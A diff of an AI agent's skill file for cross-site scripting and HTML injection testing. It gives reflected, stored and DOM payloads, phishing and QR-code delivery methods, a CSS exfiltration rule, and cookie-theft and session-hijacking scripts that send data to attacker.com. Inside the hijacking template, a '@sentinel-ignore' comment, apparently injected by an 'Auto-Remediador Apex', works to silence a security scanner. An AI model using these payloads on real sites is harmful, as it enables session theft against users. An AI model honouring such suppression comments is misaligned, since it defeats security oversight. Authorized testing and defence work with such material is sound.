@@ -8,7 +8,6 @@ id: skill-xss-html-injection
 owner: [[orchestrator]]
 ---
 
-
 > AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
 
 # Cross-Site Scripting and HTML Injection Testing
@@ -20,18 +19,21 @@ Execute comprehensive client-side injection vulnerability assessments on web app
 ## Inputs / Prerequisites
 
 ### Required Access
+
 - Target web application URL with user input fields
 - Burp Suite or browser developer tools for request analysis
 - Access to create test accounts for stored XSS testing
 - Browser with JavaScript console enabled
 
 ### Technical Requirements
+
 - Understanding of JavaScript execution in browser context
 - Knowledge of HTML DOM structure and manipulation
 - Familiarity with HTTP request/response headers
 - Understanding of cookie attributes and session management
 
 ### Legal Prerequisites
+
 - Written authorization for security testing
 - Defined scope including target domains and features
 - Agreement on handling of any captured session data
@@ -49,10 +51,13 @@ Execute comprehensive client-side injection vulnerability assessments on web app
 ### Phase 1: Vulnerability Detection
 
 #### Identify Input Reflection Points
+
 Locate areas where user input is reflected in responses:
 
 ```
+
 # Common injection vectors
+
 - Search boxes and query parameters
 - User profile fields (name, bio, comments)
 - URL fragments and hash values
@@ -60,9 +65,11 @@ Locate areas where user input is reflected in responses:
 - Form fields with client-side validation only
 - Hidden form fields and parameters
 - HTTP headers (User-Agent, Referer)
+
 ```
 
 #### Basic Detection Testing
+
 Insert test strings to observe application behavior:
 
 ```html
@@ -83,6 +90,7 @@ Insert test strings to observe application behavior:
 ```
 
 Monitor for:
+
 - Raw HTML reflection without encoding
 - Partial encoding (some characters escaped)
 - JavaScript execution in browser console
@@ -91,16 +99,19 @@ Monitor for:
 #### Determine XSS Type
 
 **Stored XSS Indicators:**
+
 - Input persists after page refresh
 - Other users see injected content
 - Content stored in database/filesystem
 
 **Reflected XSS Indicators:**
+
 - Input appears only in current response
 - Requires victim to click crafted URL
 - No persistence across sessions
 
 **DOM-Based XSS Indicators:**
+
 - Input processed by client-side JavaScript
 - Server response doesn't contain payload
 - Exploitation occurs entirely in browser
@@ -108,15 +119,18 @@ Monitor for:
 ### Phase 2: Stored XSS Exploitation
 
 #### Identify Storage Locations
+
 Target areas with persistent user content:
 
 ```
+
 - Comment sections and forums
 - User profile fields (display name, bio, location)
 - Product reviews and ratings
 - Private messages and chat systems
 - File upload metadata (filename, description)
 - Configuration settings and preferences
+
 ```
 
 #### Craft Persistent Payloads
@@ -157,36 +171,46 @@ Password: <input type="password" name="pass"><br>
 ### Phase 3: Reflected XSS Exploitation
 
 #### Construct Malicious URLs
+
 Build URLs containing XSS payloads:
 
 ```
+
 # Basic reflected payload
+
 https://target.com/search?q=<script>alert(document.domain)</script>
 
 # URL-encoded payload
+
 https://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E
 
 # Event handler in parameter
+
 https://target.com/page?name="><img src=x onerror=alert(1)>
 
 # Fragment-based (for DOM XSS)
+
 https://target.com/page#<script>alert(1)</script>
 ```
 
 #### Delivery Methods
+
 Techniques for delivering reflected XSS to victims:
 
 ```
+
 1. Phishing emails with crafted links
 2. Social media message distribution
 3. URL shorteners to obscure payload
 4. QR codes encoding malicious URLs
 5. Redirect chains through trusted domains
+
 ```
 
 ### Phase 4: DOM-Based XSS Exploitation
 
 #### Identify Vulnerable Sinks
+
 Locate JavaScript functions that process user input:
 
 ```javascript
@@ -206,6 +230,7 @@ location.replace()
 ```
 
 #### Identify Sources
+
 Locate where user-controlled data enters the application:
 
 ```javascript
@@ -240,6 +265,7 @@ frames[0].postMessage('<img src=x onerror=alert(1)>','*');
 ### Phase 5: HTML Injection Techniques
 
 #### Reflected HTML Injection
+
 Modify page appearance without JavaScript:
 
 ```html
@@ -263,6 +289,7 @@ input[value^="b"]{background:url(http://attacker.com/b)}
 ```
 
 #### Stored HTML Injection
+
 Persistent content manipulation:
 
 ```html
@@ -353,12 +380,15 @@ Fake login form or misleading content here
 ## Quick Reference
 
 ### XSS Detection Checklist
+
 ```
+
 1. Insert <script>alert(1)</script> → Check execution
 2. Insert <img src=x onerror=alert(1)> → Check event handler
 3. Insert "><script>alert(1)</script> → Test attribute escape
 4. Insert javascript:alert(1) → Test href/src attributes
 5. Check URL hash handling → DOM XSS potential
+
 ```
 
 ### Common XSS Payloads
@@ -374,6 +404,7 @@ Fake login form or misleading content here
 | SVG context | `<svg onload=alert(1)>` |
 
 ### Cookie Theft Payload
+
 ```javascript
 <script>
 new Image().src='http://attacker.com/c='+btoa(document.cookie);
@@ -381,6 +412,7 @@ new Image().src='http://attacker.com/c='+btoa(document.cookie);
 ```
 
 ### Session Hijacking Template
+
 ```javascript
 <script>
 // @sentinel-ignore: Justificación institucional inyectada por Auto-Remediador Apex
@@ -399,18 +431,21 @@ fetch('https://attacker.com/log',{
 ## Constraints and Guardrails
 
 ### Operational Boundaries
+
 - Never inject payloads that could damage production systems
 - Limit cookie/session capture to demonstration purposes only
 - Avoid payloads that could spread to unintended users (worm behavior)
 - Do not exfiltrate real user data beyond scope requirements
 
 ### Technical Limitations
+
 - Content Security Policy (CSP) may block inline scripts
 - HttpOnly cookies prevent JavaScript access
 - SameSite cookie attributes limit cross-origin attacks
 - Modern frameworks often auto-escape outputs
 
 ### Legal and Ethical Requirements
+
 - Written authorization required before testing
 - Report critical XSS vulnerabilities immediately
 - Handle captured credentials per data protection agreements
@@ -507,9 +542,11 @@ Content-Security-Policy: script-src 'self' https://cdn.trusted.com
 | WAF blocking requests | Use encoding variations; fragment payload; null bytes; case variations |
 
 ## When to Use
+
 This skill is applicable to execute the workflow or actions described in the overview.
 
 ## Sentinel Security Policy
+
 - This asset is under Sognatore Sentinel supervision.
 - Extraction of secrets via this skill is strictly forbidden.
 - All external network calls must be audited by the security engine.
